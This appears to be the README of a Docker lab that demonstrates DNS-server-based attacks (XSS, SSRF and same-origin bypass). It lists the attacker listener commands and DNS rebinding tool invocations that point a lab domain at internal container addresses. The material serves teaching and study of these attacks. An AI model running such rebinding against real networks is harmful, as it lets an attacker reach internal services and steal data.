# DNS-Attacks

This project demonstrates three different attack vectors with the use of compromised DNS server.
- Cross-Site Scripting
- Server-Side Request Forgery
- Same-Origin Bypass

## Usage
First switch to the directory where the `docker-compose.yaml` file is located and run
```
docker-compose up -d
```

## Steps for each Attack

### XSS Attack
Attacker listener
```
python3 -m http.server 1337
```

Attacker server
```
python3 -c "import http.server, ssl; ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(certfile='cert.pem', keyfile='key.pem'); server=http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler); server.socket = ctx.wrap_socket(server.socket, server_side=True); server.serve_forever()"
```

Generate integrity checks for remote resources
```
sri-check -g <LINK>
```

### SSRF Attack
Attacker listener
```
python3 -m http.server 80
```

Rebinder command
```
python3 /opt/DNSrebinder/dnsrebinder.py --port 5253 --domain company.cyhub --rebind 172.18.0.3 --ip 216.58.214.142 --counter 1 --tcp --udp --ttl 0
```



### SOP Bypass
Attacker listener
```
python3 -m http.server 80
```

Rebinder command
```
python3 /opt/DNSrebinder/dnsrebinder.py --port 5253 --domain company.cyhub --rebind 172.18.0.3 --ip 172.18.0.1 --counter 1 --tcp --udp --ttl 0
```





